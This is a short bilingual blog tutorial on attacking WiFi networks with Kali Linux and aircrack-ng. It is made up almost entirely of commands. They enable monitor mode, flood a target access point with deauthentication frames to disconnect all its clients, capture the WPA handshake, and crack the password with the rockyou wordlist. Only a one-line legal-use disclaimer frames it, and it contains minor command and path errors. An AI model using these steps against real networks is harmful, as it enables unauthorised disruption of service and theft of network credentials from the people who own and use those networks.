---
title: 基于Kali的WiFi攻击
date: 2023.01.28 16:30:04
author: xeonds
toc: true
excerpt: 通过aircrack-ng，我们能够瘫痪路由器，或者破解WiFi的密码。
categories:
  - 计算机科学
---

>仅限于合法用途，责任自负
>Legal purpose only, do it at your own risk.

## 准备

1. 检查网卡情况

Input `ifconfig` in tty, if `wlan0` is shown, then move on next step.

2. 启动监控模式

Load device by typing

```bash
arimon-ng start wlan0
```

Then you can see an adapter named `wlan0mon` if you see output of `ifconfig`. After that, type

```bash
airodump-ng wlan0mon
```

And the monitor mode is started. If you want to quit, just using

```bash
airmon-ng stop wlan0mon
```

## Select and start!

When sanned your target, press `Ctrl+c`. Then input following in tty but **DON'T press Enter**

```bash
airodump-ng -c [CH] --bssid [BSSID] -w ~/ wlan0mon
```

Before running above, create a new tty, enter root mode and run the following command first:

```bash
aireplay-ng -0 0 -a [BSSID] wlan0mon
```

After that, all devices connected to the WiFi will be disconnected.

## Crack the password

When you see handshake package like  `WPA handshake: [PACKAGE]`, press `Ctrl+c`.

Then type

```bash
aircrack-ng -a2 -b [PACKAGE] -w [PATH-TO-PASS-DICTIONARY] ~/*.cap
```

The dictionaries can be found at `/fs/usr/share/wordlists/rockyou.txt.gz`. Unpack it and remember path to `rockyou.txt`.

Press enter, and you can get password cracked after certain times tried.

That's all for it.
